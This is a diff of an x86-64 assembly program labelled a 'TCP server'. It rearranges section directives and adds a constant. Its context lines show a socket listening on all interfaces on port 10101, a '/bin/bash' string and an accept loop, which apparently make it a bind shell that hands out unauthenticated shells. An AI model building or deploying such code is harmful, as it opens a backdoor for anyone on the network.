@@ -1,7 +1,4 @@
-/* TCP server in assembly */
-.global _start
-
-.data
+.section .data
     sin_family:     .word AF_INET
     sin_port:       .word 0x7527   /* Port number 10101 in network byte order */
     sin_addr:       .long INADDR_ANY
@@ -12,7 +9,8 @@
 
     bash:           .asciz "/bin/bash"
 
-.text
+.section .text
+.global _start
 _start:
     /* Create socket */
     movq $SYS_SOCKET, %rax
@@ -66,6 +64,7 @@ accept_loop:
     /* Endless loop to accept multiple connections */
     jmp accept_loop
 
+.section .rodata
 /* Constants */
 SYS_SOCKET:         .equ 41
 SYS_BIND:           .equ 49
@@ -78,3 +77,5 @@ AF_INET:            .equ 2
 SOCK_STREAM:        .equ 1
 IPPROTO_TCP:        .equ 6
 INADDR_ANY:         .equ 0
+sizeof_sockaddr_in: .equ 16
+
